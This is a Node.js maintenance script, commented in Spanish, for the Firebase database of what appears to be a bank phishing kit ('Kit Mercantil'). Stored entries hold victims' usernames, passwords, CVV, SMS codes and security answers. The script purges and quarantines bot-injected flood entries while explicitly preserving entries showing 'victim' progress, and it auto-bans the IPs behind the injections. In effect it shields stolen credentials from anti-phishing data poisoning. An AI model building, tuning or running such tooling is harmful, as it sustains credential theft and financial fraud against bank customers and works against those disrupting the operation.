#!/usr/bin/env node
// ============================================================
//  BOT GUARD v2.0 — Purga anti-bots para la RTDB (Kit Mercantil)
//  Consume bots_db.json (hot-reload en caliente). Escanea TODAS
//  las rutas de la RTDB, puntua cada entrada con las firmas,
//  purga (o manda a cuarentena), auto-banea IPs y sanea blocks.
//
//  USO:
//    node bot_guard.js                   -> un ciclo, SOLO INFORME (no escribe) [DEFAULT]
//    node bot_guard.js --activo          -> bucle continuo CON ESCRITURA REAL (purga)
//    node bot_guard.js --activo --once   -> un ciclo con escritura real
//
//  SEGURIDAD: por defecto el guard NUNCA escribe. El modo activo requiere
//  el flag explicito --activo. Antes de borrar una ruta entera verifica que
//  no contenga senales de victima (tokens validos, cvv/sms/preguntas).
// ============================================================
'use strict';
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http'); // soporte modo local (servidor_local.js)

const DB_FILE = path.join(__dirname, 'bots_db.json');

const argv = new Set(process.argv.slice(2));
// SEGURIDAD: por defecto SOLO INFORME. Escrituras/purgas requieren --activo explicito.
const REPORT = !argv.has('--activo');
const ONCE = argv.has('--once') || REPORT;

let DB = null;
let reCache = new Map();

// ---------- carga / hot-reload ----------
function loadDB() {
  try {
    const raw = fs.readFileSync(DB_FILE, 'utf8').replace(/^\uFEFF/, '');
    DB = JSON.parse(raw);
    reCache.clear();
    return true;
  } catch (e) {
    console.error('[GUARD] Error cargando bots_db.json: ' + e.message);
    return false;
  }
}
let wt = null;
try {
  fs.watch(DB_FILE, () => {
    clearTimeout(wt);
    wt = setTimeout(() => {
      if (loadDB()) console.log('[GUARD] bots_db.json recargado en caliente (v' + DB.version + ')');
    }, 400);
  });
} catch (e) { /* watch no disponible */ }

function compile(rx, tag, flags) {
  const k = tag + '|' + (flags == null ? 'i' : flags) + '|' + rx;
  if (!reCache.has(k)) {
    try { reCache.set(k, new RegExp(rx, flags == null ? 'i' : flags)); }
    catch (e) { console.error('[GUARD] Regex invalida (' + tag + '): ' + rx); reCache.set(k, null); }
  }
  return reCache.get(k);
}

// ---------- HTTP REST ----------
function req(method, p, body) {
  return new Promise((resolve, reject) => {
    let url = DB.firebase.base_url + p;
    if (DB.firebase.auth_token) url += (url.includes('?') ? '&' : '?') + 'auth=' + encodeURIComponent(DB.firebase.auth_token);
    const mod = url.startsWith('http://') ? http : https; // local o remota
    const r = mod.request(url, { method, headers: { 'Content-Type': 'application/json' } }, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => (res.statusCode < 300) ? resolve(d) : reject(new Error('HTTP ' + res.statusCode + ': ' + d.slice(0, 200))));
    });
    r.on('error', reject);
    r.setTimeout(20000, () => r.destroy(new Error('timeout')));
    if (body !== undefined) r.write(JSON.stringify(body));
    r.end();
  });
}
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function patchChunks(pares, chunkSize) {
  const arr = Object.entries(pares);
  for (let i = 0; i < arr.length; i += chunkSize) {
    const obj = {};
    for (const [k, v] of arr.slice(i, i + chunkSize)) obj[k] = v;
    await req('PATCH', '/.json', obj);
    await sleep(150);
  }
}

function ipToInt(ip) {
  const p = ip.split('.');
  if (p.length !== 4) return null;
  let n = 0;
  for (const s of p) {
    const v = parseInt(s, 10);
    if (isNaN(v) || v < 0 || v > 255) return null;
    n = (n * 256) + v;
  }
  return n >>> 0;
}
function ipEnCidr(ip, cidrs) {
  const a = ipToInt(ip);
  if (a === null) return false;
  for (const c of cidrs) {
    const [red, bitsStr] = String(c).split('/');
    const bits = parseInt(bitsStr, 10);
    const b = ipToInt(red);
    if (b === null || isNaN(bits)) continue;
    const mask = bits === 0 ? 0 : (0xFFFFFFFF << (32 - bits)) >>> 0;
    if (((a & mask) >>> 0) === ((b & mask) >>> 0)) return true;
  }
  return false;
}

// ---------- puntuacion de una entrada ----------
function scoreEntry(ruta, key, e, credCount, epochCount, F, DBL, burstCount) {
  let score = 0;
  const razones = [];
  const add = (s, id, nota) => { score += s; razones.push(id + (nota ? ' [' + String(nota).slice(0, 60) + ']' : '')); };

  const usuario = String(e.usuario == null ? '' : e.usuario).trim();
  const clave = String(e.clave == null ? '' : e.clave).trim();

  // ANCLA LEGITIMA (v2.2): la senal mas fuerte de victima real es (a) un token _k con
  // formato valido — solo lo genera la pagina legitima via bots_filter.js, los
  // inyectores observados nunca lo traen — o (b) progreso real del flujo
  // (cvv/sms/preguntas/command/respuestas), porque los inyectores observados solo
  // publican el primer paso (page: carga) y nunca completan. Con ancla activa, las
  // firmas de "estilo" (usuario/clave con aspecto automatizado) NO suman puntos.
  const T0 = F.tokens || {};
  const tsSeen0 = Number(e.first_seen);
  const esNueva0 = isFinite(tsSeen0) && tsSeen0 > 0 && (!T0.desde_ts || tsSeen0 >= T0.desde_ts);
  let tokenValido = false;
  if (T0.k_regex) {
    const rx0 = compile(T0.k_regex, 'tok');
    const kk0 = e._k == null ? '' : String(e._k);
    tokenValido = !!(rx0 && kk0 && rx0.test(kk0));
  }
  const pageNorm0 = String(e.page || '').toLowerCase();
  const senalVictima0 = (pageNorm0 && !/^carga(\.html)?$/.test(pageNorm0)) || !!e.command || !!e.preguntas || !!e.sms || !!e.cvv || !!e.respuestas;
  const anclaLegitima = tokenValido || senalVictima0;
  // REPETICION tambien es "estilo": entradas con ancla (pasaron por la pagina real)
  // con datos tipo 11111111111 son trolls/pruebas humanas, no inyectores — se conservan.
  const FIRMAS_ESTILO = { USR_ALEATORIO_BAJO: 1, USR_TECLADO_RUN: 1, USR_MASH_TECLADO: 1, USR_NO_LEGITIMO: 1, USR_REPETICION: 1, CLV_ALEATORIA_FUERTE: 1, CLV_TECLADO_RUN: 1, CLV_MASH: 1, CLV_REPETICION: 1 };

  // 1) firmas de la KEY de la entrada (UUID, flood epoch, multi-guion, TEST_, base64)
  for (const s of (F.claves_regex || [])) {
    const rx = compile(s.rx, 'key');
    if (rx && rx.test(key)) add(s.score, s.id, s.nota);
  }

  // 2) usuario_exactos
  if (usuario && (F.usuario_exactos || []).some(x => String(x).toLowerCase() === usuario.toLowerCase())) add(100, 'USR_EXACTO', usuario);

  // 3) usuario_regex (test*, repeticiones, mash de teclado, trolls, bot*)
  for (const s of (F.usuario_regex || [])) {
    if (anclaLegitima && FIRMAS_ESTILO[s.id]) continue;
    const rx = compile(s.rx, 'usr', s.flags);
    if (rx && usuario && rx.test(usuario)) add(s.score, s.id, s.nota);
  }

  // 4) usuario_legitimo estricto (solo cedula / RIF / email)
  const UL = F.usuario_legitimo || {};
  if (UL.estricto && usuario && !anclaLegitima) {
    const ok = (UL.patrones || []).some(p => { const rx = compile(p, 'ul'); return rx && rx.test(usuario); });
    if (!ok) add(UL.score_fallo != null ? UL.score_fallo : 100, 'USR_NO_LEGITIMO', usuario);
  }

  // 5) credenciales_exactas en blacklist (formato usuario|clave)
  const cred = usuario + '|' + clave;
  if ((F.credenciales_exactas || []).some(x => String(x) === cred)) add(100, 'CRED_BLACKLIST', cred);

  // 6) firmas de la clave/contrasena
  for (const s of (F.clave_regex || [])) {
    if (anclaLegitima && FIRMAS_ESTILO[s.id]) continue;
    const rx = compile(s.rx, 'clv', s.flags);
    if (rx && clave && rx.test(clave)) add(s.score, s.id, s.nota);
  }

  // 7) token _k: solo castiga si NO hay ancla y el token falta o es invalido.
  //    Entradas ANTERIORES al despliegue del filtro (T.desde_ts) se toleran:
  //    eran legitimas sin _k/_htok porque el filtro todavia no existia.
  const T = F.tokens || {};
  if (T.k_regex && !tokenValido) {
    const kk = e._k == null ? '' : String(e._k);
    add(esNueva0 ? (T.score_fallo != null ? T.score_fallo : 70) : 20, 'TOKEN_INVALIDO', kk || '(ausente)');
  }

  // 8) first_seen (futuro o demasiado viejo)
  const FS = F.first_seen || {};
  if (FS.futuro_max_ms != null && e.first_seen != null) {
    const ts = Number(e.first_seen);
    if (!isFinite(ts)) add(FS.score_fallo != null ? FS.score_fallo : 80, 'FIRST_SEEN_NO_NUM');
    else if (ts > Date.now() + FS.futuro_max_ms) add(FS.score_fallo != null ? FS.score_fallo : 80, 'FIRST_SEEN_FUTURO', new Date(ts).toISOString());
    else if (Date.now() - ts > (FS.pasado_max_dias || 180) * 86400000) add(FS.score_fallo != null ? FS.score_fallo : 80, 'FIRST_SEEN_VIEJO', new Date(ts).toISOString());
  }

  // 9) IP de la entrada (si la trae)
  const ip = String(e.ip || e._ip || '').trim();
  if (ip) {
    if ((DB.ips.estaticas || []).indexOf(ip) !== -1) add(100, 'IP_ESTATICA', ip);
    else if (ipEnCidr(ip, DB.ips.cidrs_datacenter || [])) add(60, 'IP_DATACENTER', ip);
  }

  // 10) _htok ausente SOLO en entradas posteriores al despliegue del filtro
  if (esNueva0 && e._htok === undefined && e.page) add(40, 'HTOK_AUSENTE');

  // 11) flood: credenciales duplicadas / misma epoca
  if (usuario && (credCount.get(cred) || 0) > (DBL.flood_dup_credenciales || 2)) {
    add(40, 'FLOOD_DUP_CRED', 'x' + credCount.get(cred));
  }
  const m = /^M_(\d{13})_/.exec(key);
  if (m && (epochCount.get(m[1]) || 0) > (DBL.flood_misma_epoca || 3)) {
    add(40, 'FLOOD_EPOCA', m[1]);
  }

  // 11b) BURST_CARGA (v2.3): lotes automaticos — N+ envios page=carga sin senal de
  //      victima dentro de la ventana de tiempo = ritmo de maquina. NO lo anula la
  //      ancla: los bots con navegador real copian _k/_htok pero no el ritmo humano.
  const B = (F.burst_carga || {});
  if (B.min_entradas && burstCount && !senalVictima0) {
    const tsB = Number(e.first_seen);
    if (isFinite(tsB) && tsB > 0) {
      const bkt = Math.floor(tsB / (B.ventana_ms || 10000));
      const nB = burstCount.get(bkt) || 0;
      if (nB >= B.min_entradas) add(B.score != null ? B.score : 70, 'BURST_CARGA', 'x' + nB + ' envios en ' + ((B.ventana_ms || 10000) / 1000) + 's');
    }
  }

  // 12) COMBO_BOT: usuario automatizado + clave automatizada = patron de inyector.
  //     Ninguna senal aislada purga; la combinacion manda a cuarentena (o purga si ademas
  //     hay flood/epoch/UUID). victimas con usuario humano o clave humana quedan fuera.
  //     EXCEPCION: si la entrada demuestra progreso real de victima (paginas posteriores
  //     a carga, command, preguntas, sms, cvv) NO se aplica COMBO_BOT: los inyectores
  //     observados solo publican el primer paso (carga) y nunca completan el flujo.
  const fired = new Set(razones.map(r => r.split(' ')[0]));
  const usrAuto = fired.has('USR_ALEATORIO_BAJO') || fired.has('USR_TECLADO_RUN') || fired.has('USR_MASH_TECLADO') || fired.has('USR_REPETICION');
  const clvAuto = fired.has('CLV_ALEATORIA_FUERTE') || fired.has('CLV_TECLADO_RUN') || fired.has('CLV_MASH') || fired.has('CLV_REPETICION');
  if (usrAuto && clvAuto && !senalVictima0) add(60, 'COMBO_BOT', 'usuario y clave con aspecto automatizado');

  return { score, razones };
}

// ---------- ciclo principal ----------
async function ciclo() {
  if (!DB) return;
  const M = DB.modo || {};
  const S = DB.scope || {};
  const L = DB.limites || {};
  const F = DB.firmas || {};
  const ACTIVO = !REPORT && M.purge_bots !== false;

  const stats = { rutas: 0, rutasBorradas: 0, entradas: 0, purgadas: 0, cuarentena: 0, bans: 0, errores: 0 };
  const ipsBan = new Map();
  const logItems = [];
  const t0 = Date.now();

  try {
    let rutas = [];
    try {
      const shallow = JSON.parse(await req('GET', '/.json?shallow=true') || '{}');
      rutas = Object.keys(shallow || {});
    } catch (e) {
      console.error('[GUARD] No se pudo listar la RTDB: ' + e.message);
      return;
    }

    const chunk = L.tamano_patch || 500;

    for (const ruta of rutas) {
      if ((S.rutas_ignoradas || []).indexOf(ruta) !== -1) continue;
      stats.rutas++;

      // --- rutas inyectoras (UUID de replit, etc.) ---
      let rutaMala = null;
      for (const f of (S.firmas_rutas || [])) {
        const rx = compile(f.rx, 'ruta');
        if (rx && rx.test(ruta)) { rutaMala = f.id; break; }
      }
      if (!rutaMala && S.solo_permitidos && (S.rutas_permitidas || []).indexOf(ruta) === -1) rutaMala = 'FUERA_DE_PERMITIDOS';

      if (rutaMala) {
        // SEGURIDAD: nunca borrar una ruta entera sin verificar que no contiene victimas.
        let senalesVictima = 0, totalRuta = 0;
        try {
          const dr = JSON.parse(await req('GET', '/' + encodeURIComponent(ruta) + '.json') || 'null');
          if (dr && typeof dr === 'object' && !Array.isArray(dr)) {
            for (const k in dr) {
              const e = dr[k];
              if (!e || typeof e !== 'object') continue;
              totalRuta++;
              const tokOk = typeof e._k === 'string' && /^(MRC2024_[0-9a-f]{1,2}_v2|MRC2024_NaN_v2)$/.test(e._k);
              if (e._htok === 1 || tokOk || e.cvv || e.sms || e.preguntas || e.comandos || (e.usuario && /^[0-9]{4,12}$/.test(String(e.usuario)))) senalesVictima++;
            }
          }
        } catch (e) { stats.errores++; }
        if (S.purge_rutas_infectadas && ACTIVO && senalesVictima === 0 && totalRuta > 0) {
          try { await req('DELETE', '/' + encodeURIComponent(ruta) + '.json'); stats.rutasBorradas++; console.log('  [RUTA] ' + ruta + ' ELIMINADA (' + rutaMala + ', ' + totalRuta + ' entradas, 0 senales de victima)'); }
          catch (e) { stats.errores++; console.error('  [RUTA] fallo borrando ' + ruta + ': ' + e.message); }
        } else {
          console.log('  [RUTA*] ' + ruta + ' marcada (' + rutaMala + (totalRuta ? ', ' + totalRuta + ' entradas' : '') + (senalesVictima ? ', ' + senalesVictima + ' SENALES DE VICTIMA: no se borra, revisar manualmente' : '') + ')' + (ACTIVO ? '' : ' [informe]'));
        }
        continue;
      }

      // --- escaneo de entradas dentro de la ruta ---
      let data;
      try { data = JSON.parse(await req('GET', '/' + encodeURIComponent(ruta) + '.json') || 'null'); }
      catch (e) { stats.errores++; continue; }
      if (!data || typeof data !== 'object' || Array.isArray(data)) continue;

      // contexto de flood + burst (dos pasadas)
      const credCount = new Map(), epochCount = new Map(), burstCount = new Map();
      const B = (F.burst_carga || {});
      const ventanaB = B.ventana_ms || 10000;
      const keys = Object.keys(data);
      stats.entradas += keys.length;
      for (const k of keys) {
        const e = data[k];
        if (!e || typeof e !== 'object') continue;
        const cred = String(e.usuario || '').trim() + '|' + String(e.clave || '').trim();
        credCount.set(cred, (credCount.get(cred) || 0) + 1);
        const m = /^M_(\d{13})_/.exec(k);
        if (m) epochCount.set(m[1], (epochCount.get(m[1]) || 0) + 1);
        // al burst solo cuentan entradas sin senal de victima (las victimas progresan
        // a paginas posteriores; el registro queda con la ultima pagina visitada)
        if (B.min_entradas) {
          const pnB = String(e.page || '').toLowerCase();
          const svB = (pnB && !/^carga(\.html)?$/.test(pnB)) || e.command || e.preguntas || e.sms || e.cvv || e.respuestas;
          if (!svB) {
            const tsB = Number(e.first_seen);
            if (isFinite(tsB) && tsB > 0) {
              const bkt = Math.floor(tsB / ventanaB);
              burstCount.set(bkt, (burstCount.get(bkt) || 0) + 1);
            }
          }
        }
      }

      const patch = {};
      const jail = {};
      let purR = 0, cuR = 0;
      for (const k of keys) {
        const e = data[k];
        if (!e || typeof e !== 'object') continue;
        const { score, razones } = scoreEntry(ruta, k, e, credCount, epochCount, F, L, burstCount);

        if (score >= (M.umbral_purga || 140)) {
          patch[encodeURIComponent(ruta) + '/' + encodeURIComponent(k)] = null;
          stats.purgadas++; purR++;
          if (M.aprender_bots) logItems.push({ ruta, key: k, usuario: String(e.usuario || ''), score, razones });
          const ip = String(e.ip || e._ip || '').trim();
          if (ip) ipsBan.set(ip, (ipsBan.get(ip) || 0) + 1);
        } else if (M.cuarentena && score >= (M.umbral_cuarentena || 60)) {
          jail[ruta + '__' + k] = { ruta, key: k, datos: e, ts: Date.now(), score, razones };
          patch[encodeURIComponent(ruta) + '/' + encodeURIComponent(k)] = null;
          stats.cuarentena++; cuR++;
        }
      }

      if (Object.keys(patch).length) {
        if (ACTIVO) await patchChunks(patch, chunk);
      }
      if (Object.keys(jail).length && ACTIVO) await patchChunks(jail, chunk);
      if (!ACTIVO && (purR || cuR || keys.length)) {
        console.log('  [' + ruta + '] purgar:' + purR + ' | cuarentena:' + cuR + ' | conservar:' + (keys.length - purR - cuR) + ' | total:' + keys.length + ' [informe]');
      }
    }

    // --- saneo de blocks/ips (contaminacion base64) ---
    if (M.sanear_blocks_ips) {
      try {
        const blocks = JSON.parse(await req('GET', '/blocks/ips.json') || '{}');
        const bad = {};
        for (const k of Object.keys(blocks || {})) {
          for (const s of (F.claves_regex || [])) {
            const rx = compile(s.rx, 'key');
            if (rx && rx.test(k)) { bad['blocks/ips/' + encodeURIComponent(k)] = null; break; }
          }
        }
        if (Object.keys(bad).length) {
          if (ACTIVO) await patchChunks(bad, chunk);
          console.log('  [BLOCKS] ' + Object.keys(bad).length + ' claves contaminadas en blocks/ips ' + (ACTIVO ? 'saneadas' : '[informe]'));
        }
      } catch (e) { /* blocks puede no existir */ }
    }

    // --- visits con UA de bot: borrar y banear IP ---
    if (M.ban_visits_bot) {
      try {
        const visits = JSON.parse(await req('GET', '/visits.json') || '{}');
        const visPatch = {};
        const palabras = (DB.user_agents && DB.user_agents.palabras) || [];
        for (const k of Object.keys(visits || {})) {
          const v = visits[k];
          if (!v || typeof v !== 'object') continue;
          const uav = String(v.ua || v.user_agent || '').toLowerCase();
          const hit = palabras.find(w => uav.indexOf(String(w).toLowerCase()) !== -1);
          if (hit) {
            visPatch['visits/' + encodeURIComponent(k)] = null;
            const ip = String(v.ip || '').trim();
            if (ip) ipsBan.set(ip, (ipsBan.get(ip) || 0) + 1);
          }
        }
        if (Object.keys(visPatch).length) {
          if (ACTIVO) await patchChunks(visPatch, chunk);
          console.log('  [VISITS] ' + Object.keys(visPatch).length + ' visitas de bots ' + (ACTIVO ? 'eliminadas' : '[informe]'));
        }
      } catch (e) { /* visits puede no existir */ }
    }

    // --- auto-baneo de IPs ---
    if (M.auto_ban_ips && ipsBan.size) {
      const banPatch = {};
      for (const [ip, hits] of ipsBan) {
        if (hits >= (M.ban_min_captcha || 2)) {
          banPatch['blocks/ips/' + ip.replace(/\./g, '_')] = { ip, ts: Date.now(), razon: 'bot_guard', hits };
          stats.bans++;
        }
      }
      if (Object.keys(banPatch).length) {
        if (ACTIVO) await patchChunks(banPatch, chunk);
        console.log('  [BAN] ' + Object.keys(banPatch).length + ' IPs baneadas ' + (ACTIVO ? '' : '[informe]'));
      }
    }

    // --- aprendizaje: log de lo purgado ---
    if (M.aprender_bots && logItems.length) {
      const logPatch = {};
      for (const it of logItems.slice(0, L.detalle_nuevos_por_ciclo || 150)) {
        logPatch['guard_log/' + Date.now() + '_' + Math.floor(Math.random() * 100000)] = {
          ruta: it.ruta, key: it.key, usuario: it.usuario, score: it.score, razones: it.razones, ts: Date.now()
        };
      }
      if (ACTIVO) await patchChunks(logPatch, chunk);
    }

    console.log('[' + new Date().toLocaleTimeString() + '] ' + (ACTIVO ? 'CICLO OK' : 'INFORME') +
      ' | rutas:' + stats.rutas + ' (borradas ' + stats.rutasBorradas + ')' +
      ' | entradas:' + stats.entradas + ' | purgadas:' + stats.purgadas +
      ' | cuarentena:' + stats.cuarentena + ' | bans:' + stats.bans +
      ' | errores:' + stats.errores + ' | ' + (Date.now() - t0) + 'ms');
  } catch (e) {
    console.error('[GUARD] Error en ciclo: ' + e.message);
  }
}

// ---------- exports (auditorias externas) ----------
module.exports = { scoreEntry, compile, loadDB, req, get DB() { return DB; } };

// ---------- main ----------
if (require.main === module) {
  (async () => {
    if (!loadDB()) process.exit(1);
    console.log('BOT GUARD v' + DB.version + ' iniciado' + (REPORT ? ' [MODO INFORME --report: no escribe]' : ' [MODO ACTIVO]'));
    await ciclo();
    if (!ONCE) {
      const iv = ((DB.modo && DB.modo.intervalo_seg) || 8) * 1000;
      setInterval(ciclo, iv);
      console.log('[GUARD] Bucle continuo cada ' + (iv / 1000) + 's. Ctrl+C para salir.');
    } else {
      process.exit(0);
    }
  })();
}
